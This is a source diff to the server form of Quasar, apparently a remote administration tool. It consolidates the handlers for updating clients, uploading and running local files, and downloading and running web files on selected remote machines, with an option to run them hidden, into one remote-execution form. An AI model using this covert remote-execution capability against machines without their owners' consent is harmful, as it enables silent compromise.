@@ -12,9 +12,11 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Net.Sockets;
+using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 using System.Windows.Forms;
+using Quasar.Common.Cryptography;
 
 namespace Quasar.Server.Forms
 {
@@ -96,6 +98,18 @@ namespace Quasar.Server.Forms
             }
             serverCertificate = new X509Certificate2(Settings.CertificatePath);
 #endif
+            /*var str = Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert));
+
+            var cert2 = new X509Certificate2(Convert.FromBase64String(str));
+            var serverCsp = (RSACryptoServiceProvider)serverCertificate.PublicKey.Key;
+            var connectedCsp = (RSACryptoServiceProvider)new X509Certificate2(cert2).PublicKey.Key;
+
+            var result = serverCsp.ExportParameters(false);
+            var result2 = connectedCsp.ExportParameters(false);
+
+            var b = SafeComparison.AreEqual(result.Exponent, result2.Exponent) &&
+                    SafeComparison.AreEqual(result.Modulus, result2.Modulus);*/
+
             ListenServer = new QuasarServer(serverCertificate);
             ListenServer.ServerState += ServerState;
             ListenServer.ClientConnected += ClientConnected;
@@ -443,7 +457,7 @@ namespace Quasar.Server.Forms
 
         #region "Client Management"
 
-                private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
+        private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
             {
@@ -453,81 +467,11 @@ namespace Quasar.Server.Forms
 
         private void updateToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            // TODO: Refactor file upload
-            if (lstClients.SelectedItems.Count != 0)
+            Client[] clients = GetSelectedClients();
+            if (clients.Length > 0)
             {
-                using (var frm = new FrmUpdate(lstClients.SelectedItems.Count))
-                {
-                    if (frm.ShowDialog() == DialogResult.OK)
-                    {
-                        if (!frm.UseDownload && !File.Exists(frm.UploadPath)) return;
-
-                        if (frm.UseDownload)
-                        {
-                            foreach (Client c in GetSelectedClients())
-                            {
-                                c.Send(new DoClientUpdate
-                                {
-                                    Id = 0,
-                                    DownloadUrl = frm.DownloadUrl,
-                                    FileName = string.Empty,
-                                    Block = new byte[0x00],
-                                    MaxBlocks = 0,
-                                    CurrentBlock = 0
-                                });
-                            }
-                        }
-                        else
-                        {
-                            string path = frm.UploadPath;
-
-                            new Thread(() =>
-                            {
-                                bool error = false;
-                                foreach (Client c in GetSelectedClients())
-                                {
-                                    if (c == null) continue;
-                                    if (error) continue;
-
-                                    var srcFile = new FileSplitLegacy(path);
-                                    if (srcFile.MaxBlocks < 0)
-                                    {
-                                        MessageBox.Show($"Error reading file: {srcFile.LastError}",
-                                            "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-                                        error = true;
-                                        break;
-                                    }
-
-                                    int id = FileTransfer.GetRandomTransferId();
-
-                                    //SetStatusByClient(this, c, "Uploading file...");
-
-                                    for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
-                                    {
-                                        byte[] block;
-                                        if (!srcFile.ReadBlock(currentBlock, out block))
-                                        {
-                                            MessageBox.Show($"Error reading file: {srcFile.LastError}",
-                                                "Update aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-                                            error = true;
-                                            break;
-                                        }
-
-                                        c.Send(new DoClientUpdate
-                                        {
-                                            Id = id,
-                                            DownloadUrl = string.Empty,
-                                            FileName = string.Empty,
-                                            Block = block,
-                                            MaxBlocks = srcFile.MaxBlocks,
-                                            CurrentBlock = currentBlock
-                                        });
-                                    }
-                                }
-                            }).Start();
-                        }
-                    }
-                }
+                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
+                frmRe.Show();
             }
         }
 
@@ -653,85 +597,21 @@ namespace Quasar.Server.Forms
 
         private void localFileToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            // TODO: Refactor file upload
-            if (lstClients.SelectedItems.Count != 0)
+            Client[] clients = GetSelectedClients();
+            if (clients.Length > 0)
             {
-                using (var frm = new FrmUploadAndExecute(lstClients.SelectedItems.Count))
-                {
-                    if (frm.ShowDialog() == DialogResult.OK && File.Exists(frm.LocalFilePath))
-                    {
-                        string path = frm.LocalFilePath;
-                        bool hidden = frm.Hidden;
-
-                        new Thread(() =>
-                        {
-                            bool error = false;
-                            foreach (Client c in GetSelectedClients())
-                            {
-                                if (c == null) continue;
-                                if (error) continue;
-
-                                var srcFile = new FileSplitLegacy(path);
-                                if (srcFile.MaxBlocks < 0)
-                                {
-                                    MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
-                                        "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-                                    error = true;
-                                    break;
-                                }
-
-                                int id = FileTransfer.GetRandomTransferId();
-
-                                // SetStatusByClient(this, c, "Uploading file...");
-
-                                for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
-                                {
-                                    byte[] block;
-                                    if (srcFile.ReadBlock(currentBlock, out block))
-                                    {
-                                        c.SendBlocking(new DoUploadAndExecute
-                                        {
-                                            Id = id,
-                                            FileName = Path.GetFileName(path),
-                                            Block = block,
-                                            MaxBlocks = srcFile.MaxBlocks,
-                                            CurrentBlock = currentBlock,
-                                            RunHidden = hidden
-                                        });
-                                    }
-                                    else
-                                    {
-                                        MessageBox.Show(string.Format("Error reading file: {0}", srcFile.LastError),
-                                            "Upload aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-                                        error = true;
-                                        break;
-                                    }
-                                }
-                            }
-                        }).Start();
-                    }
-                }
+                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
+                frmRe.Show();
             }
         }
 
         private void webFileToolStripMenuItem_Click(object sender, EventArgs e)
         {
-            if (lstClients.SelectedItems.Count != 0)
+            Client[] clients = GetSelectedClients();
+            if (clients.Length > 0)
             {
-                using (var frm = new FrmDownloadAndExecute(lstClients.SelectedItems.Count))
-                {
-                    if (frm.ShowDialog() == DialogResult.OK)
-                    {
-                        foreach (Client c in GetSelectedClients())
-                        {
-                            c.Send(new DoDownloadAndExecute
-                            {
-                                Url = frm.Url,
-                                RunHidden = frm.Hidden
-                            });
-                        }
-                    }
-                }
+                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
+                frmRe.Show();
             }
         }
 
